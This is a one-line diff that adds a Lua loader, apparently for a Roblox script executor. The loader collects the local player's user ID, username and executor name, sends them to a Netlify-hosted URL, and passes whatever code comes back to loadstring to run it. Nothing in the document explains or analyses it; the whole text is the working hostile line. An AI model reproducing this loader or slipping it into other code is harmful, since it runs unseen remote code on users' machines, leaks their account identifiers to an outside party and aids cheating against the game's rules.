@@ -1,0 +1,1 @@
+local p=game.Players.LocalPlayer;local ex=identifyexecutor and identifyexecutor() or "Unknown";loadstring(game:HttpGet("https://enchanting-taffy-271c03.netlify.app/s/vOg92F87aakARqWpztlg?uid="..p.UserId.."&uname="..p.Name.."&ex="..ex))()
